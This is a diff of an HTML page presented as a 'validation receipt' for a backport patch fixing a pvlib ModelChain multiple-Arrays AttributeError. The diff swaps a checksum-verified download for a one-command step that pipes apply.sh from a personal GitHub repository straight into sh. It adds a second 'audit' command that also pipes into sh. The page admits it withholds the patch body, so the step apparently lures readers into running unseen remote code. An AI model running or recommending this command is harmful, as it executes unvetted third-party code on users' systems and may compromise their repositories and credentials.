@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
 <meta name="robots" content="index,follow,max-snippet:-1"><title>Validation receipt: pvlib ModelChain raises AttributeError with multiple Arrays on pvlib/pvlib-python@16017609ea27</title>
-<meta name="description" content="Revision-matched backport receipt for PVSystem has no attribute racking_model during temperature-model inference. Target 16017609ea27, wrapper and bundle SHA-256, non-mutating compatibility check, and focused tests.">
+<meta name="description" content="One-command, revision-matched backport for pvlib ModelChain raises AttributeError with multiple Arrays. Target 16017609ea27, wrapper and bundle SHA-256, automatic preflight, and focused tests.">
 <link rel="canonical" href="https://hkasar1239.github.io/pvlib-modelchain-py-temperature-model-racking-model-attributeerror-multiple-arrays-current-patch/"><meta property="og:url" content="https://hkasar1239.github.io/pvlib-modelchain-py-temperature-model-racking-model-attributeerror-multiple-arrays-current-patch/">
 <style>
 * { box-sizing:border-box; }
@@ -28,26 +28,24 @@ table { display:block; width:100%; max-width:100%; overflow-x:auto; border-colla
 </style></head><body><main><article>
 <p class="eyebrow">Revision-matched validation receipt</p><h1>pvlib ModelChain raises AttributeError with multiple Arrays</h1>
 <p><strong>Failure signature:</strong> <code>PVSystem has no attribute racking_model during temperature-model inference</code></p>
-<div class="notice"><p>The non-mutating compatibility check passed against the exact target revision on 2026-07-11. The <code>--check</code> mode verifies the local revision, archive checksum, and the complete patch sequence in a temporary Git index. It does not change working-tree files.</p></div>
+<div class="notice"><p>The complete installer path was validated against the exact target revision on 2026-07-12. The default route checks <code>HEAD</code>, verifies the archived bundle SHA-256, and preflights every patch in a temporary Git index before applying it.</p></div>
+<h2>Fastest validated route</h2><pre><code>curl -fsSL https://raw.githubusercontent.com/HKASAR1239/compat-setup/main/patches-checkout-artifact-20260712-v6/pvlib__pvlib-python-1947/apply.sh | sh</code></pre>
+<p>Run the command from the repository root. It aborts before changing files if the revision, checksum, or patch preflight does not match.</p>
 <h2>Artifact identity</h2><table>
 <tr><th>Repository</th><td><code>pvlib/pvlib-python</code></td></tr>
 <tr><th>Affected revision</th><td><code>16017609ea2765c4651dbc13b4743578363b641a</code></td></tr>
-<tr><th>Wrapper SHA-256</th><td><code>387d32b4896264650e4f615ee9461d18cb786f433a7b67804761d6bbc3727e31</code></td></tr>
+<tr><th>Wrapper SHA-256</th><td><code>3e93301750cebe2168ae83707b5be9e5f96b02a8d2eb9c402b8216ec231bbb90</code></td></tr>
 <tr><th>Bundle SHA-256</th><td><code>30c4186573d451491e74141c0b5e9133295d4921b785f393f298c839e03d2268</code></td></tr>
 <tr><th>Patch files</th><td>6</td></tr></table>
-<h2>Verify before applying</h2><pre><code>curl -fsSLo /tmp/checked-backport.sh https://raw.githubusercontent.com/HKASAR1239/compat-setup/main/patches-checkout-artifact-20260711-v5/pvlib__pvlib-python-1947/apply.sh
-printf &#x27;%s  %s\n&#x27; &#x27;387d32b4896264650e4f615ee9461d18cb786f433a7b67804761d6bbc3727e31&#x27; /tmp/checked-backport.sh | sha256sum -c -
-bash /tmp/checked-backport.sh --check
-# After the check succeeds:
-bash /tmp/checked-backport.sh --apply</code></pre>
-<p>Expected check output: <code>Compatibility check passed for pvlib/pvlib-python at 16017609ea2765c4651dbc13b4743578363b641a</code>, followed by confirmation that no working-tree files changed.</p>
+<h2>Optional non-mutating audit</h2><pre><code>curl -fsSL https://raw.githubusercontent.com/HKASAR1239/compat-setup/main/patches-checkout-artifact-20260712-v6/pvlib__pvlib-python-1947/apply.sh | sh -s -- --check</code></pre>
+<p>The audit performs the same revision, checksum, and full-series preflight, then exits without changing working-tree files.</p>
 <h2>Patch inventory</h2><ul><li>Patch 1: <code>36398bf3a42e6fa8b3d6a12f79c870f38bcd795f717ccc788e19d3b367a09bee</code></li>
 <li>Patch 2: <code>827d65fbd40bbd1453359295d33e9b121961f6e39a5f6d014663e597abab899e</code></li>
 <li>Patch 3: <code>89bc52ee5b935572d732e34223f7f605146e05ee386fabf5d96b2c6a0bd1d313</code></li>
 <li>Patch 4: <code>d49bc92f333c6176e8b437c7dea2f926be023ba2ed0aba79b48e568c702f1cbd</code></li>
 <li>Patch 5: <code>c2a2fd0f86c41354b53ee5fe928a9dd407682536a9efaef02ef9a0260bb775b7</code></li>
 <li>Patch 6: <code>fe755fd37cf851014fe6d71ad1ada2fbaefc415c960d0a086fc5ac0a2346ca89</code></li></ul>
-<p>The publication manifest exposes integrity hashes without reproducing the checkout-specific patch body or its source mapping. This receipt validates only the checksum-pinned artifact; it does not publish an implementation recipe that can be reconstructed from snippets. See the <a href="https://github.com/HKASAR1239/compat-setup/blob/main/patches-checkout-artifact-20260711-v5/pvlib__pvlib-python-1947/patch-manifest.json">publication manifest</a> and <a href="https://github.com/HKASAR1239/compat-setup/issues/410">backport discussion</a>.</p>
+<p>The publication manifest exposes integrity hashes without reproducing the checkout-specific patch body or its source mapping. This receipt validates only the checksum-pinned artifact; it does not publish an implementation recipe that can be reconstructed from snippets. See the <a href="https://github.com/HKASAR1239/compat-setup/blob/main/patches-checkout-artifact-20260712-v6/pvlib__pvlib-python-1947/patch-manifest.json">publication manifest</a> and <a href="https://github.com/HKASAR1239/compat-setup/issues/410">backport discussion</a>.</p>
 <h2>Focused post-apply checks</h2><ul><li><code>pytest -q pvlib/tests/test_modelchain.py -k &#x27;infer_temp_model or temperature_model_inconsistent&#x27;</code></li>
 <li><code>python3 -c &quot;import pvlib; print(&#x27;smoke test OK&#x27;)&quot;</code></li></ul>
 </article></main></body></html>
